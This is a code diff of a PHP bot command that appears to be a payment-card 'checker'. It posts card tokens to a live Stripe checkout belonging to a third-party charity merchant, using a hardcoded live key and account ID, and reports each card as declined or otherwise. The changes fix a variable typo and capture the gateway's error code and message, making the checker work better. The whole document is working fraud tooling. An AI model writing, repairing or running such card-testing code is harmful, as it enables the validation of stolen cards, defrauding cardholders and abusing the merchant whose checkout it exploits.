@@ -234,7 +234,7 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             curl_setopt($ch, CURLOPT_POSTFIELDS, "eid=NA&payment_method=$id&expected_amount=10000&last_displayed_line_item_group_details[subtotal]=10000&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&_stripe_account=acct_1FnGBxBVCZ9Tk8l4&key=pk_live_SMtnnvlq4TpJelMdklNha8iD");
             $resp3 = curl_exec($ch);
             $clientsecret = trim(strip_tags(capture($resp3,'client_secret": "','"')));
-            $ippi = trim(strip_tags(capture($rep3,'id": "pi_','"')));
+            $ippi = trim(strip_tags(capture($resp3,'id": "pi_','"')));
             $intent = "pi_$ippi";
             $stripejs = trim(strip_tags(capture($resp3,'stripe_js": "','"')));
             $src = trim(strip_tags(capture($resp3,'source": "src','"')));
@@ -288,6 +288,8 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
             curl_setopt($ch, CURLOPT_POSTFIELDS, "");
             $resp5 = curl_exec($ch);
+                $errorcode5 = trim(strip_tags(capture($resp5,'"code":"','"')));
+                $errormessage5 = trim(strip_tags(capture($resp5,'"message":"','"')));
 
             /////////////////////////-------CHARITY-STRIP-----------/////////////////////////////////
 
@@ -388,7 +390,7 @@ Time -» <b>$time</b><b>s</b>
 <b>Status -» Declined! ❌
 Response -» $errormessage | 
 Decline Error -» $errorcode
-Result -» $result2 | Token - $id | HahsVal - $hashval | SessionToken - $sesstok | ClientSecret - $clientsecret | PaymentIntent - $intent | URL - $stripejs | ConfirmationURL - $confirmurl | SourceSRC - $sourcesrc | FinalURL - $final 
+Result -» $result2 | Token - $id | HahsVal - $hashval | SessionToken - $sesstok | ClientSecret - $clientsecret | PaymentIntent - $intent | URL - $stripejs | ConfirmationURL - $confirmurl | SourceSRC - $sourcesrc | FinalURL - $final | code- $errorcode5 | Messgae- $errormessage5
 Gateway -» 1💲 STRIPE
 Time -» <b>$time</b><b>s</b>
 
